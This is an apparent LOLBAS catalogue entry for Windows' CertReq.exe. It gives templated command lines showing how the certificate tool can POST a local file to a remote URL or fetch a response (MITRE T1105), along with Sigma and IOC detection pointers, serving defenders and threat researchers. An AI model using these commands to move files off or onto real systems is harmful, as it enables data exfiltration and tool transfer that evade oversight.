---
Acknowledgement:
- Person: David Middlehu
Author: David Middlehurst
Commands:
- Category: Download
  Command: CertReq -Post -config {REMOTEURL} {PATH_ABSOLUTE} {PATH:.txt}
  Description: Send the specified file (penultimate argument) to the specified URL
    via HTTP POST and save the response to the specified txt file (last argument).
  MitreID: T1105
  OperatingSystem: Windows 10, Windows 11
  Privileges: User
  Usecase: Download file from Internet
- Category: Upload
  Command: CertReq -Post -config {REMOTEURL} {PATH_ABSOLUTE}
  Description: Send the specified file (last argument) to the specified URL via HTTP
    POST and show response in terminal.
  MitreID: T1105
  OperatingSystem: Windows 10, Windows 11
  Privileges: User
  Usecase: Upload
Created: 2020-07-07
Description: Used for requesting and managing certificates
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_lolbin_susp_certreq_download.yml
- IOC: certreq creates new files
- IOC: certreq makes POST requests
Full_Path:
- Path: C:\Windows\System32\certreq.exe
- Path: C:\Windows\SysWOW64\certreq.exe
Name: CertReq.exe
Resources:
- Link: https://dtm.uk/certreq
mitre_data:
  technique_ids:
  - T1105
tags:
- lolbas/osbinaries
---

# CertReq.exe

Used for requesting and managing certificates

# Path(s)

- `C:\Windows\System32\certreq.exe`
- `C:\Windows\SysWOW64\certreq.exe`

# Upload Commands

Send the specified file (last argument) to the specified URL via HTTP POST and show response in terminal.

```batch
CertReq -Post -config {REMOTEURL} {PATH_ABSOLUTE}
```

- **Usecase:** Upload
- **Privileges Required:** User
- **MitreID:** `T1105`
- **Operating System(s):** Windows 10, Windows 11



# Download Commands

Send the specified file (penultimate argument) to the specified URL via HTTP POST and save the response to the specified txt file (last argument).

```batch
CertReq -Post -config {REMOTEURL} {PATH_ABSOLUTE} {PATH:.txt}
```

- **Usecase:** Download file from Internet
- **Privileges Required:** User
- **MitreID:** `T1105`
- **Operating System(s):** Windows 10, Windows 11



# Resource(s)

- https://dtm.uk/certreq
# Acknowledgements

- David Middlehurst (Authored, 2020-07-07)
- David Middlehu